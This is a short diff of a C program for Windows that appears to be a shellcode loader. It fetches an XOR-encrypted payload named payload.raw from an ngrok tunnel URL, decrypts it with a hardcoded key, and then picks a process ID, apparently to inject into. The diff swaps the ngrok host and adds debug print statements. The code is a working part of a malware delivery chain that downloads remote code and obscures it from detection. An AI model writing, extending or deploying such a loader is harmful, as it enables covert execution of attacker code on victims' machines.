@@ -8,7 +8,7 @@
 */
 
 
-const LPCWSTR url = L"https://7ea6af78af29.ngrok-free.app/payload.raw"; 
+const LPCWSTR url = L"https://24ab6e9116c7.ngrok-free.app/payload.raw"; 
 const char* key = "rzdhop_is_a_nice_guy";
 size_t sKey = 20;
 
@@ -161,14 +161,17 @@ int main(int argc, char **argv) {
     PBYTE pPayloadBytes = NULL;
     SIZE_T sPayloadSize = 0;
 
-    printf("[*] Getting Payload from %s", url);
+    printf("[*] Getting Payload from %s\n", url);
     if (!GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize)) {
         printf("[-] Failed to get payload\n");
         return -1;
     }
-
+    printf("[*] Payload retreived from server (size :%zu)\n", sPayloadSize);
     // XOR decrypt payload
     XOR(pPayloadBytes, sPayloadSize, (PUCHAR)key, sKey);
+    printf("[*] Payload deciphered : 0x%02x%02x%02x%02x%02x%02x...\n",
+    pPayloadBytes[0], pPayloadBytes[1], pPayloadBytes[2],
+    pPayloadBytes[3], pPayloadBytes[4], pPayloadBytes[5]);
 
     DWORD PID = choosePID();
     if (PID == 0) return -1;
